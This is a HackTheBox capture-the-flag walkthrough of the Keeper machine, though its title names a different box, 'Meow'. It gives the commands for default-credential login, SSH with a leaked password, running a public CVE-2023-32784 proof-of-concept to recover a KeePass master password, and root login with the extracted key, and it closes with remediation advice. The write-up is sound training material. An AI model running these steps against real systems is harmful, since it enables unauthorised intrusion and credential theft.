---
title: "HTB: Meow - Easy Linux Box"
description: "Comprehensive walkthrough of the Keeper machine from HackTheBox. Initial foothold gained through default credentials on Request Tracker installation, followed by KeePass database exploitation. Covers credential harvesting, KeePass vulnerability CVE-2023-32784, and SSH key extraction for root access."
difficulty: "Easy"
platform: "HackTheBox"
category: "Linux"
tags: ["htb", "linux", "privesc", "webapp", "keepass", "cve"]
date: "2025-12-10"
featured: true
---

## Overview

Keeper is an Easy-rated Linux machine from HackTheBox that involves exploiting default credentials and a KeePass vulnerability.

**Target Information:**
* **IP:** 10.10.11.227
* **Difficulty:** Easy
* **OS:** Linux

## Reconnaissance

### Port Scanning

Starting with an initial nmap scan:

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.227
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

### Web Enumeration

Visiting the web server reveals a Request Tracker installation at **http://tickets.keeper.htb/rt/**.

Adding to hosts file:
```bash
echo "10.10.11.227 keeper.htb tickets.keeper.htb" >> /etc/hosts
```

## Initial Access

### Default Credentials

Request Tracker has well-known default credentials:
* **Username:** `root`
* **Password:** `password`

These credentials work! We're now logged into the RT admin panel.

### User Enumeration

In the admin panel, we find a user `lnorgaard` with credentials mentioned in a ticket:

```
Username: lnorgaard
Password: Welcome2023!
```

### SSH Access

Using these credentials for SSH:
```bash
ssh lnorgaard@10.10.11.227
```

We're in! **User flag obtained.**

## Privilege Escalation

### KeePass Database Discovery

In the user's home directory, we find interesting files:
* `KeePassDumpFull.dmp` - Memory dump file
* `passcodes.kdbx` - KeePass database

```bash
ls -la /home/lnorgaard/
```

### CVE-2023-32784 Exploitation

KeePass has a vulnerability (**CVE-2023-32784**) where the master password can be extracted from memory dumps.

Using the PoC exploit:
```bash
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
python3 poc.py /home/lnorgaard/KeePassDumpFull.dmp
```

**Recovered password:** `rødgrød med fløde` (Danish dessert name)

### Database Access

Opening the KeePass database with the recovered password reveals root's PuTTY SSH key in PPK format.

```bash
keepassxc-cli show passcodes.kdbx
```

### Root Access

Converting the PPK key to OpenSSH format:
```bash
puttygen root_key.ppk -O private-openssh -o root_key
chmod 600 root_key
ssh -i root_key root@10.10.11.227
```

**Root flag obtained!**

## Key Takeaways

1. **Always change default credentials** immediately after installation
2. **Don't store sensitive information** in ticket systems
3. **KeePass memory dumps** can leak master passwords (CVE-2023-32784)
4. **Proper key management** is crucial for security
5. **Information disclosure** in support tickets can lead to compromise

## Remediation

1. Change default credentials immediately after installation
2. Update KeePass to patch CVE-2023-32784
3. Avoid storing credentials in plaintext in tickets
4. Use strong, unique passwords for all services
5. Implement proper access controls on sensitive files
6. Regular security audits of installed applications
7. Principle of least privilege for user accounts
